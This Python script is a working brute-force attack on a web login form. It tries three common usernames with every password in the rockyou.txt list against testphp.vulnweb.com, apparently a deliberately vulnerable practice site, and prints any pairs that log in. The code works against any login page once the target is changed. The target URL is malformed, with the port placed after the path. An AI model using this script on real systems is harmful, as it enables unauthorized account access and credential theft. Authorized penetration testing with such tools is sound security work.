import requests
import sys
import itertools

# Update the target URL where the login is performed
target = "http://testphp.vulnweb.com/login.php:8080"

usernames = ["admin", "user", "test"]
passwords = "rockyou.txt"

# Update the needle value to match the expected response indicating successful login
needle = "Address"

found_credentials = []

with open(passwords, encoding="latin-1") as password_list:
    for username, password in itertools.product(usernames, password_list):
        username = username.strip()
        password = password.strip().encode("latin-1")

        sys.stdout.write("[X] Attempting user:password -> {}:{}".format(username, password.decode("latin-1")))
        sys.stdout.flush()

        response = requests.post(target, data={"password": password.decode("latin-1"), "username": username})

        if needle.encode() in response.content:
            found_credentials.append((username, password.decode("latin-1")))

        sys.stdout.write("\r" + " " * 80 + "\r")  # Clear line
        sys.stdout.flush()

if found_credentials:
    sys.stdout.write("\n")
    sys.stdout.write("[>>>>>] Valid credentials found:\n")
    for username, password in found_credentials:
        sys.stdout.write("\t- User: {}\tPassword: {}\n".format(username, password))
else:
    sys.stdout.write("\n")
    sys.stdout.write("[>>>>>] No valid credentials found.\n")
sys.stdout.flush()
